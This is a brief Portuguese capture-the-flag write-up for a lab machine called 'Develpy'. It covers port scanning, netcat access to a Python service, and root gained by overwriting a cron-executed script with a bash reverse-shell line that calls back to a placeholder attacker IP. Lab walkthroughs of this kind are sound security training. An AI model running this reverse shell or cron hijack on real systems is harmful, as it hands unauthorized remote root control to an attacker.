# Develpy

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.203.224
```
![image](https://github.com/lufffe/Writeups/assets/90646635/8b100942-e554-41ae-bb5a-632977fc9dfe)

![image](https://github.com/lufffe/Writeups/assets/90646635/e9afa434-f442-4db2-9272-a4032e338f5d)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,10000 10.10.203.224
```
![image](https://github.com/lufffe/Writeups/assets/90646635/58fba8e1-dd50-4d14-89fe-4ef9461b8fbb)

* ### Ligando o Netcat na porta e podemos ver que ta rodando algo com python.
```bash
nc 10.10.203.224 10000
```
![image](https://github.com/lufffe/Writeups/assets/90646635/b313cc4e-6ac6-416e-90d1-0f4325dd0718)

![image](https://github.com/lufffe/Writeups/assets/90646635/b787ad89-52fe-49a6-b67b-312716e68a3b)

* ### Flag User;
```bash
cat user.txt
```

* ### Depois de um tempo procurando sem encontrar, olhei o crontab.
```bash
cat /etc/crontab
```
![image](https://github.com/lufffe/Writeups/assets/90646635/086568b1-0eee-4917-9390-398dc19a534f)


* ### Escalando previlégios.
```bash
rm root.sh
```
```bash
echo "bash -i >& /dev/tcp/[SEU IP]/4445 0>&1" > root.sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/3cd78694-1dad-47a0-a236-cfcb77bde5b9)

![image](https://github.com/lufffe/Writeups/assets/90646635/46439f17-05ef-4a1d-92a1-78c5345ab5aa)

* ### Flag Root.
```bash
cat root.txt
```
